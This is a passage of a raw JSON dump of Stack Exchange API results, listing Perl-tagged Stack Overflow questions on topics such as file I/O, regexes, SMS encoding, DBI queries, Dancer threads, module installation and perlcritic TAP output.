$1:</p>\n\n<p>1.</p>\n\n<pre><code>y:\\car\\main.cs@@jung\" \"Added format of version number to all sub-parts.\n\n\"Hallo Peter\"\n\n@@@ \"tool kit\" @@@\"\n</code></pre>\n\n<p>2.</p>\n\n<pre><code>y:\\car\\main.cs@@kkla\" (lkaskdn awdiwj)\n\n\"The filter \"function of the new version works with Excel 2007\"only,\nbut is the correct filter structure.\n\n@@@ \"Huihu boy\" @@@\"\n</code></pre>\n\n<p>but it would only give me the first.</p>\n"},{"tags":["perl","date","timestamp"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":13009464,"title":"Perl write last run time to file","body":"<p>(New to perl)</p>\n\n<p>I'm trying to update an existing perl script to store in a file the last time that it was run, in order to do something \"since\" that date on the next run.</p>\n\n<p>Is there a safe way to store this in a file that I can then read into a timestamp again?</p>\n\n<p>I've found out how to write files</p>\n\n<pre><code># Open for writing\nopen(MYFILE,\"&gt;$filepath/$filename\") || \"&gt; ERROR: Couldn't open file for writing\\n\";\nprint MYFILE $result;\nclose MYFILE;\n</code></pre>\n\n<p>And also how to get the time as a string</p>\n\n<pre><code>my ($sec, $min, $hour, $day, $mon, $year) = localtime();\n$LAST_RUN_DATETIME=strftime( \"%Y/%m/%d %T\", $sec, $min, $hour, $day, $mon, $year);\n</code></pre>\n\n<p>Thanks for your time </p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13008153,"title":"Many files and searching by recursion in Perl","body":"<p>I have a little problem with searching files in my catalog structures. For example I have a directory \"page\". Inside it I have two directories: \"a\" and \"b\". Both directories contain files: a.html and b.html. How write in Perl recursion procedure which find this files and, for example, write them into screen?</p>\n\n<p>In more specific. I don't know how to write \"universal\" path of file. For example:</p>\n\n<pre><code>open (FILE, \"page/ (find a and b) / find (a.html and b.html)\" ) or die \"Can't open!\";\n</code></pre>\n"},{"tags":["perl","sms","special-characters","urlencode"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":13007306,"title":"Special characters Encoding Perl script","body":"<p>I'm raising up an issue I had declared as resolved a few weeks ago on users@kannel.org with regard to sending out special characters in sms ( users digest , Vol. 74, Issue 14 Topic HTTP Encoding);</p>\n\n<p>I was having trouble sending special character symbols to the sms and had resolved this by implementing charset=utf-8 and coding=2 in my perl script that's handling sending of the sms.</p>\n\n<pre><code>.......\nuse CGI::Enurl;\nuse Unicode::Lite;\n........\n($msgType =~ /(?:web)|(?:err)|(?:text)/i) ? '&amp;text=' . enurl($text).'&amp;coding=2'.'&amp;charset=utf-8'\n........\n</code></pre>\n\n<p>but now Ive realized this caused me to start receiving half-messages most of them are truncated after the 90th character while or one response that is 444 characters, they're truncated after the 105 character.</p>\n\n<p>how can I ensure that I send through these special characters while at the same time not affecting my processing?</p>\n\n<p>Additional Info:</p>\n\n<p>This is the code snippet that handles the various message types (error, text, logo,tone etc). Ive commented the change .'&amp;coding=2'.'&amp;charset=utf-8' to allow me to continue receiving full messages. Now only thing that doesn't work is the special symbols. The line that handles these text responses is the first line.</p>\n\n<pre><code>$URL .= (\n      ($msgType =~ /(?:web)|(?:err)|(?:text)/i) ? '&amp;text=' . enurl($text)#.'&amp;coding=2'.'&amp;charset=utf-8'\n    : ($msgType =~ /(?:logo)/i) ? '&amp;udh=%06%05%04%15%82%00%00&amp;text=' . $code . delimit_bytes($text)\n    : ($msgType =~ /^(?:tone)$/i)\n    ? '&amp;udh=' . delimit_bytes('0B0504158115810003660101') . '&amp;text=' . delimit_bytes($text)\n    : ($msgType =~ /^(?:etone)$/i) ? '&amp;udh=' . delimit_bytes($text) . '&amp;text=+'\n    : ($msgType =~ /(?:unicode)/i) ? '&amp;text=' . enurl(convert('latin1', 'unicode', $text)) . '&amp;coding=3'\n    : \"\"\n  )\n</code></pre>\n"},{"tags":["perl","sql-server-2008","config"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":13006624,"title":"Perl Syntax Error: bareword found where operator expected","body":"<p>This is my perl script code. in this i'm getting error like \"bareword found where operator expected at $cmd\"</p>\n\n<pre><code>my $path = $folder.\"/\".$host.\"_\".$database_name.\".bak\";\n$cmd .= \"-U $user_name -P $password -S $host -d master -Q \"BACKUP DATABASE [$database_name] TO DISK = N'$path'\" \";\n</code></pre>\n\n<p>any one help me?</p>\n"},{"tags":["perl","oracle"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":13004023,"title":"Passing variables into sqlplus query in perl","body":"<p>I'm having an issue here. I am trying to pass a variable into a sqlplus query, and it does not seem to be working.</p>\n\n<pre><code>    my $connect = DBI-&gt;connect('DBI:Oracle:',$dbuser,$dbpasswd);\n  my $query = \"select sum(transaction_amnt) from comm_to_cand natural join cmte_id_to_geo where cycle='?'\", $cycle;\n  my $query_handle = $connect-&gt;prepare($query);\n  $query_handle-&gt;execute();\n  $cmte_money = $query_handle-&gt;fetchrow_array();\n\n  print 'Money: ';\n  print $cmte_money;\n\n  if($cmte_money &gt; 0)\n  {\n    print 'HI';\n  }\n  else\n  {\n    print 'NOOOO';\n  }\n</code></pre>\n\n<p>I can get the query to work when I change the \"cycles\" variable from a variable to a constant, and the if statement checking will print hi, so the databases work I'm positive.</p>\n\n<p>I've scoured the internet, and I can't seem to find an answer.</p>\n"},{"tags":["perl","ubuntu","webkit"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":13006541,"title":"How to get p5-Switch on ubuntu 12.10","body":"<p>I was using ubuntu 12.04 until 12.10 was released. I used ubuntu for software development and after installing 12.10, i noticed that the perl version (5.14) shipped with 12.10 does not include the Switch.pm module needed while building WebKiT-GTK.</p>\n\n<p>Looking around on the internet i found few suggestions indicating that i should install something call p5-switch from something called ports. I have looked around and was not able to get this done. I am not a perl guy and have no idea where i can get this package.</p>\n\n<p>Can someone please help me as to \n1. Where to download the package for ubuntu 12.10 \n2. In case it is not a .deb, How do i install it.\nOR\n1. At least be able to downgrade the perl installation to something lower than 5.14</p>\n\n<p>Thanks and Regards \n~Sameer</p>\n"},{"tags":["python","perl","metadata"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":13005955,"title":"How to retrieve album name from track title and artist?","body":"<p>I am trying to create a script as a part of learning process which will organize my music folder in the format <code>Artist/Album/Track</code>. Now, most of my mp3 have correct <code>Track Title</code> and <code>Artist name</code> metadata information but some are missing album name from the metadata. </p>\n\n<p>Now, I want to retrieve the album name by using <code>Track Title</code> and <code>Artist name</code> metadata through my script because I don't want to do this process manually.</p>\n\n<p>So, how do I approach this because I am aware of <code>musicbrainz , freedb</code> service but not able to find any relevant method which will help in simplifying this task.</p>\n\n<p>I have added <code>python/perl</code> tag because these are the language of my choice.</p>\n"}]}
{"total":22324,"page":7,"pagesize":100,"questions":[{"tags":["algorithm","perl","loops"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":91,"score":2,"question_id":12969364,"title":"How Break The Infinite Loop in Perl Under Redo (generating random number)","body":"<p>I intend to generate random number the following step:</p>\n\n<ol>\n<li>Read the data from file <code>(&lt;DATA&gt;)</code></li>\n<li>Generate random numbers as many as the input data lines</li>\n<li>The random number should <em>not</em> be generated twice, \ne.g. if the rand number generated in loop no x, has been created\n     before then, recreate the random number. </li>\n</ol>\n\n<p>Here is the code I have which leads to infinite loop.\nWhat's wrong with my logic, and how can I fix it?</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nmy %chrsize = ('chr1' =&gt;249250621);\n\n# For example case I have created the\n# repository where a value has been inserted.\nmy %done =(\"chr1    182881372\" =&gt; 1);\n\nwhile ( &lt;DATA&gt; ) {\n chomp;\n next if (/^\\#/);\n\n my ($chr,$pos) = split(/\\s+/,$_);\n # this number has been generated before\n # with this: int(rand($chrsize{$chr}));\n # hence have to create other than this one\n my $newst =182881372;\n\n my $newpos = $chr .\"\\t\".$newst;\n\n\n # recreate random number\n for (0...10){\n     if ( $done{$newpos} ) {\n\n            # INFINITE LOOP\n            $newst = int(rand($chrsize{$chr}));\n            redo;\n     }\n }\n\n $done{$newpos}=1;\nprint \"$newpos\\n\";\n\n}\n\n\n__DATA__\n# In reality there are 20M of such lines\n# name  positions\nchr1    157705682\nchr1    19492676\nchr1    169660680\nchr1    226586538\nchr1    182881372\nchr1    11246753\nchr1    69961084\nchr1    180227256\nchr1    141449512\n</code></pre>\n"},{"tags":["perl","cpan","dancer"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":95,"score":2,"question_id":11414169,"title":"Dancer::Plugin::Auth::RBAC member registration example?","body":"<p>I'm trying to build a membership site and I'm interested in using Perl to do this. \nI looked at the Dancer framework which seems nice, but I can't figure out how to actually create a member registration / login process using Dancer::Plugin::Auth::RBAC. The CPAN page shows some example code but nothing that is very explicit or complete. \nGoogling around didn't turn up much usable except some simple examples with hardcoded login/passwords. \nThanks\nB</p>\n"},{"tags":["perl","time","cpan","intervals","time-format"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":199,"score":4,"question_id":7545664,"title":"Is there a CPAN module for converting seconds to English?","body":"<p>Is there a CPAN module that can convert a number of seconds to a human-readable English description of the interval?</p>\n\n<pre><code>secToEng( 125 ); # =&gt; 2 min 5 sec\nsecToEng( 129_600 ); # =&gt; 1 day 12 h\n</code></pre>\n\n<p>The format isn't important as long as it's human-readable.</p>\n\n<p>I know that it would be trivial to implement.</p>\n"},{"tags":["perl","catalyst"],"answer_count":5,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":833,"score":6,"question_id":917380,"title":"Is it feasible to learn Perl and Catalyst at the same time?","body":"<p>Is it feasible to learn Perl and Catalyst at the same time? If so, what would be the typical path?</p>\n\n<p>I am experienced .Net/C#/C++ developer but fairly new to Perl</p>\n"},{"tags":["javascript","html","perl","comments"],"answer_count":4,"favorite_count":0,"up_vote_count":9,"down_vote_count":1,"view_count":234,"score":8,"question_id":12972302,"title":"Finding comments in HTML","body":"<p>I have an HTML file and within it there may be Javascript, PHP and all this stuff people may or may not put into their HTML file.</p>\n\n<p>I want to extract all comments from this html file.</p>\n\n<p>I can point out two problems in doing this:</p>\n\n<ol>\n<li><p>What is a comment in one language may not be a comment in another.</p></li>\n<li><p>In Javascript, remainder of lines are commented out using the <code>//</code> marker. But URLs also contain <code>//</code> within them and I therefore may well eliminate parts of URLs if I\njust apply substituting <code>//</code> and then the\nremainder of the line, with nothing.</p></li>\n</ol>\n\n<p>So this is not a trivial problem.</p>\n\n<p>Is there anywhere some solution for this already available?</p>\n\n<p>Has anybody already done this?</p>\n"},{"tags":["perl","dancer"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12992982,"title":"threads in Dancer","body":"<p>I'm using Dancer 1.31, in a standard configuration (plackup/Starman). </p>\n\n<p>In a request I wished to call a perl function asynchronously, so that the request returns inmmediately. Think of the typical \"long running operation\" scenario, in which one wants to return a \"processing page\" with a refresh+redirect.</p>\n\n<p>I (naively?) tried with a thread:</p>\n\n<pre><code>sub myfunc {  \n   sleep 9; # just for testing a slow operation\n}\n\nany '/test1' =&gt; sub {\n   my $thr = threads-&gt;create('myfunc'); \n   $thr-&gt;detach();\n   return \"done\" ;\n};\n</code></pre>\n\n<p>I does not work, the server seems to freeze, and the error log does not show anything. I guess manual creation of threads are forbidden inside Dancer?  It's an issue with PSGI? Which is the recommended way?</p>\n"},{"tags":["jquery","json","perl","post","cgi"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":13000943,"title":"Perl CGI->Vars() not properly hashing cgi parameters","body":"<p>I am trying to use MySQL, Perl and JS to make a simple registration form for my website.  The Perl script works fine when given parameters directly via cmdline or via the URL and the MySQL properly registers the user.  The issue is with the JS; when I sent the data via a JSON post the Perl script receives the the post and attempts to create a hash of the parameters given via the code:</p>\n\n<p><code>%params = $cgh-&gt;Vars()</code></p>\n\n<p>However, this doesn't properly split the parameters and assign them to individual keys.  Instead, the Perl script creates a hash that looks like this:</p>\n\n<p>%params data</p>\n\n<pre><code>$VAR1 = 'POSTDATA';\n$VAR2 = 'action=register&amp;uname=d&amp;pass=d&amp;first=d&amp;last=d&amp;email=anemail@themailplace.com&amp;phone=d';\n</code></pre>\n\n<p>I suspect that the JS needs to change how it is submitting the data and not the way the Perl script is accepting the data. In any case, here is the JS:</p>\n\n<pre><code>$(document).ready(function(){\n    $(\"form#register-form\").submit(function() { // register-form is submitted\n        var username = $('#username').attr('value'); // get username\n        var password = $('#password').attr('value'); // get password\n        var repassword = $('#repassword').attr('value'); // get password\n        var firstName = $('#firstName').attr('value'); // get password\n        var lastName = $('#lastName').attr('value'); // get password\n        var email = $('#email').attr('value'); // get password\n        var phone = $('#phone').attr('value'); // get password\n\n        if (username &amp;&amp; password &amp;&amp; repassword &amp;&amp; firstName &amp;&amp; lastName &amp;&amp; email &amp;&amp; phone) { // values are not empty\n            $.ajax({\n                type: \"POST\",\n                url: \"/cgi/login.pl\", // URL of the Perl script\n                contentType: \"application/json; charset=utf-8\",\n                dataType: \"json\",\n                // send username and password as parameters to the Perl script\n                data: \"action=register\" + \"&amp;uname=\" + username + \"&amp;pass=\" + password + \"&amp;first=\" + firstName + \"&amp;last=\" + lastName\n                    + \"&amp;email=\" + email + \"&amp;phone=\" + phone,\n                // script call was *not* successful\n                error: function(XMLHttpRequest, textStatus, errorThrown) {\n                    $('div#register-result').text(\"responseText: \" + XMLHttpRequest.responseText\n                        + \", textStatus: \" + textStatus\n                        + \", errorThrown: \" + errorThrown);\n                    $('div#register-result').addClass(\"error\");\n                }, // error \n                // script call was successful \n                // data contains the JSON values returned by the Perl script \n                success: function(data){\n                    if (data.error) { // script returned error\n                        $('div#register-result').text(\"data.error: \" + data.error);\n                        $('div#register-result').addClass(\"error\");\n                        } // if\n                    else { // login was successful\n                        $('form#register-form').hide();\n//                        $('div#register-result').text(\"data.success: \" + data.success + \", data.userid: \" + data.userid);\n//                        $('div#register-result').addClass(\"success\");\n                    } //else\n                } // success\n            }); // ajax\n        } // if\n        else {\n            $('div#register-result').text(\"enter username and password\");\n            $('div#register-result').addClass(\"error\");\n        } // else\n//    $('div#register-result').fadeIn();\n    return false;\n    });\n});\n</code></pre>\n\n<p>Unless relevant to the issue, please ignore the fact that I do next to no checks on the info submitted by the form.  Let me know if you require any more information.  Thank you in advanced.</p>\n"},{"tags":["perl","musicbrainz"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12999750,"title":"Perl: How to retrieve album metadata from MusicBrainz?","body":"<p>I am creating a Perl script which will move a mp3 file to my music folder in format <code>artist/album/mp3file</code>. Now it is possible that some of my mp3 files don't have an <code>album tag</code> so I thought of querying the <a href=\"http://musicbrainz.org/\" rel=\"nofollow\">MusicBrainz</a> database to retrieve album metadata given <code>track title &amp; artist</code>.</p>\n\n<p>I am using <a href=\"http://search.cpan.org/~bfaist/WebService-MusicBrainz-0.93/lib/WebService/MusicBrainz.pm\" rel=\"nofollow\">WebService::MusicBrainz</a> Perl module for this task, but I am not able to see any method that gives album metadata info. My current code is:</p>\n\n<pre><code>use WebService::MusicBrainz::Track;\n\nmy $ws = WebService::MusicBrainz::Track-&gt;new();\nmy $response = $ws-&gt;search({ ARTIST =&gt; 'Ryan Adams', TITLE =&gt; 'when the stars go blue'  }); \n\nmy $track = $response-&gt;track();\nprint $track-&gt;title(), \" - \", $track-&gt;artist()-&gt;name(), \"\\n\";\n\nsay $track-&gt;id();\n</code></pre>\n\n<p>So, how do I get my the album info for a given track using MusicBrainz and if it is not possible what are my alternative options?</p>\n"},{"tags":["regex","perl","awk","match"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":12999103,"title":"awk syntax for getting part of a matched regex","body":"<p>Am sure this is easy, so apologies. In Perl I might do something like</p>\n\n<pre><code>my $str = \"foo=23\";\n$str ~= m/foo=([0-9]+)/\nprint \"foo value is \" . $1\n</code></pre>\n\n<p>ie use parentheses in the regex to be able to refer to part of the match later as $1, $2 etc.\nWhat is the equivalent in awk?</p>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":13000389,"title":"regular expression achieve two goals : replacement and removal","body":"<p>I couldn't set a better title for the question but my problem is this:</p>\n\n<p>given a line of the form :</p>\n\n<pre><code>int a,b,var1,var2;\n</code></pre>\n\n<p>I need to convert it to a line of the form</p>\n\n<pre><code>s(a);s(b);s(var1);s(var2);\n</code></pre>\n\n<p>so far I have this:</p>\n\n<pre><code>s/\\b(\\w)[,;]/s\\(\\1\\);/g\n</code></pre>\n\n<p>but it only converts it to </p>\n\n<pre><code>int s(a);s(b);s(var1);s(var2);\n</code></pre>\n\n<p>I need to not see the <code>int</code> part. Can this be done using only one regex?</p>\n"},{"tags":["perl","error-handling","coding-style","perl-critic"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":445,"score":4,"question_id":4156391,"title":"Is it better to croak() or to die() when something bad happens in Perl?","body":"<p>Perlcritic complaints that the following code, some boilerplate DBI stuff that works perfectly fine, should croak() instead of die():</p>\n\n<pre><code>#Connect to database\nmy $db_handle = DBI-&gt;connect( $url, $user, $password )\n    or die $DBI::errstr;\n</code></pre>\n\n<p>All these while, die()-ing seems to work fine for me. </p>\n\n<p><em>I would think for a samurai Perl warrior, croak()-ing is less honorable than actually die()-ing when things go awry.</em> </p>\n\n<p>Jokes aside ..</p>\n\n<p><strong>Why should I croak() instead of die()?</strong> </p>\n\n<p><strong>What are the consequences of not heeding perlcritic's advice?</strong></p>\n"},{"tags":["osx","perl","installation","imagemagick","cpan"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12996578,"title":"how to tell cpanm Image::Magick about header location?","body":"<p>On OS X cpanm Image::Magick fails with</p>\n\n<blockquote>\n  <p>Magick.xs:60:10: fatal error: 'magick/MagickCore.h' file not found</p>\n  \n  <p>#include &lt; magick/MagickCore.h></p>\n</blockquote>\n\n<p>The file is present though. (That space is from me to have it display here.)</p>\n\n<p>How can I tell cpanm and/or Image::Magick where to find those headers?</p>\n\n<p>(IM is installed from source.)</p>\n"},{"tags":["python","osx","perl","applescript"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":60,"score":-1,"question_id":12994829,"title":"List all active short cuts of current active application on Mac OS","body":"<p>How I can list active short cuts of current active application on Mac OS?</p>\n"},{"tags":["perl","asynchronous","ssh","anyevent"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12993133,"title":"Running AnyEvent under Dancer application","body":"<p>I would like to do some non-blocking <em>SSH</em> to a couple of thousand machines that i'm tracking (my own machines), I have a <em>Dancer</em> application up and running, and I'm willing to use <em>AnyEvent::timer</em> to execute <em>SSH</em> commands asynchronously (each machine has its own polling interval, and I don't want one machine to wait for another to complete with its <em>SSH</em> work).</p>\n\n<p>I'm wondering, what is the best way to act asynchronously in a synchronous environment?</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":12994341,"title":"Using Test::More, how do I print out a debug message in my tested function?","body":"<p>I write some test cases for a function <code>foo</code>.</p>\n\n<p>Some test cases fail, and to debug and find the problem, I wish to print some debug messages inside function <code>foo</code>.</p>\n\n<p>My attempts are:</p>\n\n<ul>\n<li>Print to stdout, later I learned that <code>Test::More</code> does not want me to modify stdout.</li>\n<li>Print to stderr, my messages are not shown when I execute <code>make test</code></li>\n</ul>\n\n<p>I learned about <code>diag</code> <code>note</code> and <code>explain</code>, I did <code>diag('test')</code> inside <code>foo</code> however the message is not printed. Examples of them show that they are to be used inside test case function.</p>\n\n<p>I really want to print a message in my <code>foo</code> when I run test case for it!</p>\n\n<p>So what is the most correct way to achieve this?</p>\n"},{"tags":["regex","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":12969341,"title":"Perl regex match longest sequence","body":"<p>I have a string like below</p>\n\n<pre><code>atom:link[@me=\"samiron\" and @test1=\"t1\" and @test2=\"t2\"]\n</code></pre>\n\n<p>and I need a regular expression which will generate the following back references </p>\n\n<pre><code>#I would prefer to have\n$1 = @test1\n$2 = t1\n$3 = @test2\n$4 = t2\n\n#Or at least. I will break these up in parts later on.\n$1 = @test1=\"t1\"\n$2 = @test2=\"t2\"\n</code></pre>\n\n<p>I've tried something like <code>( and [@\\w]+=[\"\\w]+)*\\]</code> which returns only last match <code>and @test2=\"t2\"</code>. Completely out of ideas. Any help?</p>\n\n<p><strong>Edit:</strong>\nactually the number of <code>@test1=\"t1\"</code> pattern is not fixed. And the regex must fit the situation. Thnx @Pietzcker.</p>\n"},{"tags":["perl","md5"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":43,"score":3,"question_id":12993663,"title":"Inconsistent External Command Output","body":"<p>The terminal transcript speaks for itself:</p>\n\n<pre>\niMac:~$ echo -n a | md5\n0cc175b9c0f1b6a831c399e269772661\niMac:~$ perl -e 'system \"echo -n a | md5\"'\nc3392e9373ccca33629d82b17699420f\n</pre>\n\n<p>Note that the  MD5 hash of <code>a</code> is  0cc175b9c0f1b6a831c399e269772661, the first\nresult. Why does it turns out to  be different when the same command is called\nby perl?</p>\n\n<hr>\n\n<p>By the way, perl is <em>perl 5, version 12, subversion 4 (v5.12.4) built for darwin-thread-multi-2level</em>. And the system: Mac OS 10.8, Darwin 12.0</p>\n"},{"tags":["perl","workaround"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12994100,"title":"Perl Encode.pm cannot decode string with wide character","body":"<p>I was running a perl app which uses <code>/opt/local/lib/perl5/5.12.4/darwin-thread-multi-2level/Encode.pm</code></p>\n\n<p>and issues an error </p>\n\n<pre><code>Cannot decode string with wide characters at /opt/local/lib/perl5/5.12.4/darwin-thread-multi-2level/Encode.pm line 174.\n</code></pre>\n\n<p>Line 174 of <code>Encode.pm</code> reads </p>\n\n<pre><code>sub decode($$;$) {\n    my ( $name, $octets, $check ) = @_;\n    return undef unless defined $octets;\n    $octets .= '' if ref $octets;\n    $check ||= 0;\n    my $enc = find_encoding($name);\n    unless ( defined $enc ) {\n        require Carp;\n        Carp::croak(\"Unknown encoding '$name'\");\n    }\n    my $string = $enc-&gt;decode( $octets, $check );  # line 174\n    $_[1] = $octets if $check and !ref $check and !( $check &amp; LEAVE_SRC() );\n    return $string;\n}\n</code></pre>\n\n<p>Any workaround?</p>\n"},{"tags":["perl","security","random","reverse-engineering","srand"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":176,"score":5,"question_id":12497045,"title":"What are the weaknesses of Perl's srand() default seed, post version 5.004?","body":"<p>I can find plenty of documentation as to issues with use of <code>time()</code> prior to Perl version 5.004, but nothing following.</p>\n\n<p>For a homework assignment, we are asked to reverse-engineer a program's results based on the assumption that the default Perl <code>srand()</code> is still flawed in default seeding. The <a href=\"http://perldoc.perl.org/perl5004delta.html#New-and-changed-builtin-functions\">changelog for the perl 5.004 release</a> states that the <code>srand()</code> default seed is now based on \"a heavy mix of difficult-to-predict system-dependent values.\"</p>\n\n<p>Is that the case, and, if so, what are those values and do they have any inherent weaknesses?</p>\n"},{"tags":["mysql","database","perl"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3227,"score":0,"question_id":4729722,"title":"Trying to install Perl-Mysql DBD, mysql_config can't be found","body":"<p>Here's the output:</p>\n\n<pre>Ian-MacBook-Pro:DBD-mysql-4.011 ianseyer$ sudo Perl Makefile.PL\nCan't exec \"mysql_config\": No such file or directory at Makefile.PL line 76.\n\nCannot find the file 'mysql_config'! Your execution PATH doesn't seem \nnot contain the path to mysql_config. Resorting to guessed values!\nCan't exec \"mysql_config\": No such file or directory at Makefile.PL line 454.\nCan't find mysql_config. Use --mysql_config option to specify where mysql_config is located\nCan't exec \"mysql_config\": No such file or directory at Makefile.PL line 454.\nCan't find mysql_config. Use --mysql_config option to specify where mysql_config is located\nCan't exec \"mysql_config\": No such file or directory at Makefile.PL line 454.\nCan't find mysql_config. Use --mysql_config option to specify where mysql_config is located\n\n\nPLEASE NOTE:\n\nFor 'make test' to run properly, you must ensure that the \ndatabase user 'root' can connect to your MySQL server \nand has the proper privileges that these tests require such \nas 'drop table', 'create table', 'drop procedure', 'create procedure'\nas well as others. \n\nmysql> grant all privileges on test.* to 'root'@'localhost' identified by 's3kr1t';\n\nYou can also optionally set the user to run 'make test' with:\n\nperl Makefile.pl --testuser=username\n\nCan't exec \"mysql_config\": No such file or directory at Makefile.PL line 454.\nCan't find mysql_config. Use --mysql_config option to specify where mysql_config is located\nCan't exec \"mysql_config\": No such file or directory at Makefile.PL line 454.\nCan't find mysql_config. Use --mysql_config option to specify where mysql_config is located\nCan't exec \"mysql_config\": No such file or directory at Makefile.PL line 454.\nCan't find mysql_config. Use --mysql_config option to specify where mysql_config is located\nFailed to determine directory of mysql.h. Use\n\n  perl Makefile.PL --cflags=-I\n\nto set this directory. For details see the INSTALL.html file,\nsection \"C Compiler flags\" or type\n\n  perl Makefile.PL --help\n</pre>\n\n<p>I've researched the issue and tried making a symlink to no avail.</p>\n\n<p>Do I have to compile this myself?</p>\n"},{"tags":["perl","jenkins","tap"],"answer_count":3,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":88,"score":1,"question_id":12858759,"title":"How to get Jenkins display TAP output from perlcritic","body":"<p>Here is the command and stdout captured:</p>\n\n<pre><code>$perlcritic --gentle . | nl -nln | sed 's/\\(.*source OK\\)$/ok \\1/' | sed '/source OK$/!s/^.*$/not ok &amp;/' | tee perlcritic_tap.results.1\n</code></pre>\n\n<p>output:</p>\n\n<pre><code>not ok 1        Bareword file handle opened at line 184, column 17.  See pages 202,204 of PBP.  (Severity: 5)\nnot ok 2        Two-argument \"open\" used at line 184, column 17.  See page 207 of PBP.  (Severity: 5)\nnot ok 3        Bareword file handle opened at line 311, column 9.  See pages 202,204 of PBP.  (Severity: 5)\nnot ok 4        Two-argument \"open\" used at line 311, column 9.  See page 207 of PBP.  (Severity: 5)\nnot ok 5        Bareword file handle opened at line 371, column 12.  See pages 202,204 of PBP.  (Severity: 5)\nnot ok 6        Two-argument \"open\" used at line 371, column 12.  See page 207 of PBP.  (Severity: 5)\nnot ok 7        Bareword file handle opened at line 390, column 13.  See pages 202,204 of PBP.  (Severity: 5)\nnot ok 8        Two-argument \"open\" used at line 390, column 13.  See page 207 of PBP.  (Severity: 5)\nnot ok 9        Bareword file handle opened at line 522, column 5.  See pages 202,204 of PBP.  (Severity: 5)\nnot ok 10       Two-argument \"open\" used at line 522, column 5.  See page 207 of PBP.  (Severity: 5)\nnot ok 11       Bareword file handle opened at line 615, column 10.  See pages 202,204 of PBP.  (Severity: 5)\nnot ok 12       Two-argument \"open\" used at line 615, column 10.  See page 207 of PBP.  (Severity: 5)\n</code></pre>\n\n<p>Verify the file contents:</p>\n\n<pre><code>more perlcritic_tap.results.1 \n\nnot ok 1        Bareword file handle opened at line 184, column 17.  See pages 202,204 of PBP.  (Severity: 5)\nnot ok 2        Two-argument \"open\" used at line 184, column 17.  See page 207 of PBP.  (Severity: 5)\nnot ok 3        Bareword file handle opened at line 311, column 9.  See pages 202,204 of PBP.  (Severity: 5)\nnot ok 4        Two-argument \"open\" used at line 311, column 9.  See page 207 of PBP.  (Severity: 5)\nnot ok 5        Bareword file handle opened at line 371, column 12.  See pages 202,204 of PBP.  (Severity: 5)\nnot ok 6        Two-argument \"open\" used at line 371, column 12.  See page 207 of PBP.  (Severity: 5)\nnot ok 7        Bareword file handle opened at line 390, column 13.  See pages 202,204 of PBP.  (Severity: 5)\nnot ok 8        Two-argument \"open\" used at line 390, column 13.  See page 207 of PBP.  (Severity: 5)\nnot ok 9        Bareword file handle opened at line 522, column 5.  See pages 202,204 of PBP.  (Severity: 5)\nnot ok 10       Two-argument \"open\" used at line 522, column 5.  See page 207 of PBP.  (Severity: 5)\nnot ok 11       Bareword file handle opened at line 615, column 10.  See pages 202,204 of PBP.  (Severity: 5)\nnot ok 12       Two-argument \"open\" used at line 615, column 10.  See page 207 of PBP.  (Severity: 5)\n</code></pre>\n\n<p>Now append the top portion of TAP format:</p>\n\n<pre><code>echo 1.. `wc -l &lt; perlcritic_tap.results.1` | cat - perlcritic_tap.results.1  &gt; perlcritic_tap.results\n</code></pre>\n\n<p>perlcritic_tap.results:</p>\n\n<pre><code>1.. 12\nnot ok 1        Bareword file handle opened at line 184, column 17.  See pages 202,204 of PBP.  (Severity: 5)\nnot ok 2        Two-argument \"open\" used at line 184, column 17.  See page 207 of PBP.  (Severity: 5)\nnot ok 3        Bareword file handle opened at line 311, column 9.  See pages 202,204 of PBP.  (Severity: 5)\nnot ok 4        Two-argument \"open\" used at line 311, column 9.  See page 207 of PBP.  (Severity: 5)\nnot ok 5        Bareword file handle opened at line 371, column 12.  See pages 202,204 of PBP.  (Severity: 5)\nnot ok 6        Two-argument \"open\" used at line 371, column 12.  See page 207 of PBP.  (Severity: 5)\nnot ok 7        Bareword file handle opened at line 390, column 13.  See pages 